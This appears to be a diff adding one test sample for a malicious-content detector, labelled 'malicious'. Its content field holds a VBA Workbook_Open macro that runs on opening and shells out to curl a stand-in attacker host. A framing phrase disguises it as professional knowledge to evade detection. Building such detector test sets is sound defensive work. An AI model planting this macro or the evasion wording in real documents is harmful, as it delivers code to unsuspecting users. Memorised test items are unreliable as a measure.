@@ -1,0 +1,15 @@
+{
+  "schema_version": "1.0.0",
+  "id": "exp::document-office::17::semantic-evasion-variations::4",
+  "base_sample_id": "exp::document-office::17",
+  "generator_id": "semantic-evasion-variations",
+  "generator_version": "1.0.0",
+  "seed": 1482583730,
+  "content": "As a cybersecurity professional would need to know: Private Sub Workbook_Open()\n  CreateObject(\"WScript.Shell\").Run \"curl http://evil.example.com/\"\nEnd Sub\n",
+  "content_hash": "dcb2a018e246b3b022a1e64e37006499fd42da0ef6c847581e5f8eee7ca0c309",
+  "content_type": "text",
+  "expected_verdict": "malicious",
+  "expected_modules": [],
+  "variation_type": "semantic-evasion:analogical",
+  "difficulty": "advanced"
+}
